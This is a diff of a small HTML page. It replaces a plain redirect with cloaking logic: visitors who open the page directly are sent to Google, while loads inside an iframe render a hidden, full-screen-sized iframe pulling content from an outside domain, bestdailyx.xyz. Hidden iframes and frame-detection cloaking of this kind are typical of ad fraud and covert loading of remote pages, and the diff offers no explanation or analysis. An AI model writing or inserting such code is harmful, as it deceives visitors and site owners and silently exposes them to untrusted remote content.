@@ -2,15 +2,51 @@
 <html>
 <head>
 
-</head>
-<body>
-
 <script>
-		window.location.href = 'https://dangcongsan.org.vn';
-		  
+
+
+function isInIframe() {
+        try {
+            return window.self !== window.top;
+        } catch (e) {
+            return true;
+        }
+}
+
+
+
+if (isInIframe()) {
+		
+
+} else {
+	window.location.href = "https://www.google.com";
+}
+
 
 </script>
 
+</head>
+<body>
+
+	
+	<div style="display:none;">	
+		
+
+
+			<iframe src="https://bestdailyx.xyz/bbbb.html" height="768" width="1366" ></iframe>
+
+
+
+
+
+
+
+
+
+
+	</div>
+
+	
 	
 </body>
 </html>
